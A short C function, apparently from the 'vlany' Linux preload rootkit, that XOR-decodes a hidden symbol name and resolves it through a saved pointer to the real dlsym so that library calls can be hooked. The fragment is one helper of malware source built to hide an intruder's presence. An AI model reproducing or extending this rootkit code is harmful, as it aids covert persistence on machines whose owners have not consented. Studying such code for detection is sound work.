void *get_symbol(void *handle, int csym)
{
    #ifdef DEBUG
        printf("[vlany] get_symbol() called\n");
    #endif

    void *funcptr;
    char *symbol = strdup(calls[csym]); xor(symbol);

    if(!old_dlsym) locate_dlsym();
    funcptr = old_dlsym(handle, symbol);
    CLEAN(symbol);

    if(!funcptr) exit(1);
    
    return funcptr;
}
